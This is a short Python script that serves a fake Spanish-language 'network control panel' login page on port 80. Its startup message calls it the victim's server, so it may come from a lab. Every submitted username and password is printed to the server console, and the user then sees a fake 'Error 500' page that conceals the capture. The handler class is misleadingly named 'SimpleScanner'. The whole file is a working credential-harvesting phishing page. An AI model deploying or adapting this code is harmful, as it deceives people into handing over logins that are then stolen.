from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class SimpleScanner(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        
        html = """
        <html>
        <body style="font-family:Arial; text-align:center; padding-top:50px;">
            <h2>Acceso al Panel de Control de Red</h2>
            <form method="POST">
                Usuario: <input type="text" name="user"><br><br>
                Password: <input type="password" name="pass"><br><br>
                <input type="submit" value="Iniciar Sesion">
            </form>
        </body>
        </html>
        """
        self.wfile.write(html.encode())

    def do_POST(self):
        
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        print(f"\n[*] Datos recibidos en el servidor: {post_data}")
        
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"<h1>Error 500: Servicio temporalmente no disponible</h1>")

print("[*] Servidor web de la victima iniciado en el puerto 80...")
server = HTTPServer(('0.0.0.0', 80), SimpleScanner)
server.serve_forever()





